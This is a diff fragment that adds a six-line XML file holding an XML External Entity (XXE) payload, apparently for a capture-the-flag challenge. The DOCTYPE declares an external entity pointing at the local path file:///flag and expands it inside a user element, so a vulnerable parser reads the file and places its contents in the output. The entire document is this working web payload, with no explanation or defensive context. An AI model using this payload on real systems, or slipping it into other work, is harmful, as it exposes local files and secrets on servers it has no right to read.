@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Any [
+<!ENTITY xxe SYSTEM "file:///flag"> ]>
+<test>
+    <user>&xxe;</user>
+</test>
